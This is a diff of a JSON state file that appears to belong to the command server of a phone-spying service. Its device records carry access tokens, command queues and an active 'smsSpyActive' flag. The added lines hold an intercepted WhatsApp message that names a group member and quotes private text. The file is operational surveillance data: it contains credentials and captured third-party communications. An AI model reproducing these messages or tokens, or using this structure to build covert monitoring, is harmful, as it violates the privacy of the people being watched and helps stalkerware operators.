@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040630928,
+    "lastSeen": 1775040648850,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -3737,7 +3737,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040631560,
+    "lastSeen": 1775040646586,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -3753,6 +3753,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12162 pesan): ~ syafa karamoy",
+        "content": "iyaa ini bru pulang",
+        "time": "01/04 18:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040649310
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
